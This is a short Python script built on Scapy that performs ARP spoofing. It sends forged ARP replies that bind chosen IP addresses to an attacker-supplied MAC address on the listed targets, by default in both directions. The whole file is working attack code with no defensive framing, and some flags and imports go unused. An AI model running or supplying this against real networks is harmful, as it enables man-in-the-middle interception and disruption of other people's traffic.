from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

SPOOFED_IPS     =   ['10.0.0.1']
SPOOFED_MAC     =   "00:00:00:00:00:ff"
TARGET_IPS      =   ['192.168.1.101']
INTERFACE       =   'eth0'
BIDIRECTIONAL = True
AUTO_ADD = True
LISTENER = True

if len(sys.argv) < 4:
	print("Missing Arguments")
	sys.exit(0)

SPOOFED_IPS = sys.argv[1].split(',')
SPOOFED_MAC = sys.argv[2]
TARGET_IPS = sys.argv[3].split(',')
INTERFACE = sys.argv[4]

conf.iface = INTERFACE
conf.verb = 0
for i in range(len(TARGET_IPS)):
	CURRENT_TARGET = TARGET_IPS[i]
	for j in range(len(SPOOFED_IPS)):
		CURRENT_SPOOF = SPOOFED_IPS[j]
		print(CURRENT_TARGET + " : " +  CURRENT_SPOOF)
		send(ARP(op=2, psrc=CURRENT_SPOOF, pdst=CURRENT_TARGET, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=SPOOFED_MAC), count = 3)
		if BIDIRECTIONAL:
			send(ARP(op=2, psrc=CURRENT_TARGET, pdst=CURRENT_SPOOF, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=SPOOFED_MAC), count = 3)